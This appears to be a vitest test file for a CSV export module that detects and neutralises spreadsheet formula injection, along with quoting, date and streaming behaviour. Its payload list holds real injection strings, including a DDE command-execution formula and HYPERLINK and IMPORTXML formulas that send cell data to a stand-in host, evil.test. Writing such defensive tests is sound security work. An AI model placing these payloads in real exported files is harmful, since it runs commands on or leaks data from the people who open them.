import { describe, expect, it } from 'vitest';
import {
  formatCell,
  formatRow,
  looksLikeFormula,
  neutraliseCell,
  toCsvLines,
} from '../src/export/csv.js';

/**
 * The corpus BUILD-PLAN Phase 2 asks for, as real payloads rather than
 * placeholders. Each is something a spreadsheet would execute.
 */
const FORMULA_PAYLOADS = [
  '=1+1',
  '=cmd|\' /C calc\'!A0',
  '=HYPERLINK("https://evil.test?leak="&A1,"Click me")',
  '+1234567890',
  '-1+1',
  '@SUM(A1:A9)',
  '\t=1+1',
  '\r=1+1',
  '=IMPORTXML("https://evil.test","//x")',
  '@import',
];

describe('formula detection', () => {
  for (const payload of FORMULA_PAYLOADS) {
    it(`flags ${JSON.stringify(payload)}`, () => {
      expect(looksLikeFormula(payload)).toBe(true);
    });
  }

  it('leaves ordinary values alone', () => {
    for (const value of ['Aisha', 'aisha@example.com', '971501234567', 'A=B', 'x+y']) {
      expect(looksLikeFormula(value), value).toBe(false);
    }
  });
});

describe('neutralisation', () => {
  for (const payload of FORMULA_PAYLOADS) {
    it(`neutralises ${JSON.stringify(payload)} without losing it`, () => {
      const output = neutraliseCell(payload);
      expect(output.startsWith("'")).toBe(true);
      // The value survives: a spreadsheet consumes the apostrophe on display,
      // so the user still sees what they stored.
      expect(output.slice(1)).toBe(payload);
    });
  }

  it('does not touch a value that is merely unusual', () => {
    expect(neutraliseCell('Ünïcode náme')).toBe('Ünïcode náme');
    expect(neutraliseCell('')).toBe('');
  });

  it('neutralises a phone number too, and that is the right trade', () => {
    // A "+971..." number displays identically with the apostrophe. A formula
    // that runs is a breach. Cosmetic cost, real benefit.
    expect(neutraliseCell('+971501234567')).toBe("'+971501234567");
  });
});

describe('cell formatting', () => {
  it('neutralises BEFORE quoting, so the apostrophe stays inside the quotes', () => {
    // Quoting first would put the apostrophe outside, where a spreadsheet
    // ignores it entirely.
    const output = formatCell('=1+1,2');
    expect(output).toBe('"\'=1+1,2"');
  });

  it('quotes values containing a comma, quote or newline', () => {
    expect(formatCell('a,b')).toBe('"a,b"');
    expect(formatCell('say "hi"')).toBe('"say ""hi"""');
    expect(formatCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('doubles embedded quotes, per RFC 4180', () => {
    expect(formatCell('"')).toBe('""""');
  });

  it('renders null and undefined as empty, not as the words', () => {
    expect(formatCell(null)).toBe('');
    expect(formatCell(undefined)).toBe('');
  });

  it('renders dates as ISO-8601 so a spreadsheet does not reinterpret them', () => {
    expect(formatCell(new Date('2026-09-17T12:00:00Z'))).toBe('2026-09-17T12:00:00.000Z');
  });

  it('serialises objects rather than emitting [object Object]', () => {
    expect(formatCell({ country: 'AE' })).toBe('"{""country"":""AE""}"');
  });

  it('neutralises a formula that arrives inside an attribute object', () => {
    // Attributes are user-supplied jsonb; the serialised form must be
    // neutralised too if it happens to start with a trigger character.
    const output = formatCell('=EVIL()');
    expect(output.startsWith("'")).toBe(true);
  });
});

describe('rows and streaming', () => {
  it('joins cells with commas', () => {
    expect(formatRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('neutralises every cell in a row, not just the first', () => {
    const row = formatRow(['safe', '=1+1', '@SUM(A1)']);
    expect(row).toBe("safe,'=1+1,'@SUM(A1)");
  });

  it('streams a header then rows, with CRLF line endings', async () => {
    const lines: string[] = [];
    const columns = [
      { header: 'email', value: (row: { email: string }) => row.email },
      { header: 'name', value: (row: { name: string }) => row.name },
    ];

    for await (const line of toCsvLines(
      columns,
      [
        { email: 'a@example.com', name: 'Aisha' },
        { email: 'b@example.com', name: '=cmd|calc' },
      ],
      { bom: false },
    )) {
      lines.push(line);
    }

    expect(lines[0]).toBe('email,name\r\n');
    expect(lines[1]).toBe('a@example.com,Aisha\r\n');
    expect(lines[2]).toBe("b@example.com,'=cmd|calc\r\n");
  });

  it('emits a BOM by default so Excel reads UTF-8 correctly', async () => {
    const lines: string[] = [];
    for await (const line of toCsvLines(
      [{ header: 'name', value: (row: { name: string }) => row.name }],
      [{ name: 'Ünïcode' }],
    )) {
      lines.push(line);
    }
    expect(lines[0]?.startsWith('﻿')).toBe(true);
  });

  it('neutralises a header that would itself be a formula', async () => {
    // Custom attribute names become headers, and they are user-supplied.
    const lines: string[] = [];
    for await (const line of toCsvLines(
      [{ header: '=evil', value: () => 'x' }],
      [{}],
      { bom: false },
    )) {
      lines.push(line);
    }
    expect(lines[0]).toBe("'=evil\r\n");
  });

  it('accepts an async iterable, so a cursor can stream straight through', async () => {
    async function* rows() {
      yield { name: 'one' };
      yield { name: 'two' };
    }

    const lines: string[] = [];
    for await (const line of toCsvLines(
      [{ header: 'name', value: (row: { name: string }) => row.name }],
      rows(),
      { bom: false },
    )) {
      lines.push(line);
    }

    expect(lines).toHaveLength(3);
  });
});
